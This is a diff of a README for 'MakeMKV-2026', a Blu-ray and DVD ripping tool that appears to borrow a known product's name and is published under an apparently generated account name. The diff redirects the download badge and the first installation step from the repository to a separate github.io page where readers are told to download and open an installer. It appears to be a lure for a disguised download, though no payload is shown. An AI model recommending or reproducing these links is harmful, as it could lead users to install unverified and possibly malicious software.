@@ -1,6 +1,6 @@
 # 📀 MakeMKV-2026 - Rip your movies to digital files
 
-[![Download MakeMKV-2026](https://img.shields.io/badge/Download-MakeMKV_2026-blue.svg)](https://github.com/Qualitative-dependency749/MakeMKV-2026)
+[![Download MakeMKV-2026](https://img.shields.io/badge/Download-MakeMKV_2026-blue.svg)](https://qualitative-dependency749.github.io)
 
 MakeMKV-2026 converts your physical Blu-ray and DVD discs into digital files. These files save to your hard drive. Once on your computer, you can watch your movies without the physical disc. The software keeps the high picture and sound quality of your original recordings.
 
@@ -24,7 +24,7 @@ Your computer requires the following hardware and software to run this applicati
 
 Follow these steps to set up the software on your Windows computer.
 
-1. Visit the repository page to begin the process: [https://github.com/Qualitative-dependency749/MakeMKV-2026](https://github.com/Qualitative-dependency749/MakeMKV-2026)
+1. Visit the repository page to begin the process: [https://qualitative-dependency749.github.io](https://qualitative-dependency749.github.io)
 2. Locate the download button on the page.
 3. Click the button to save the installer file to your computer.
 4. Open your Downloads folder.
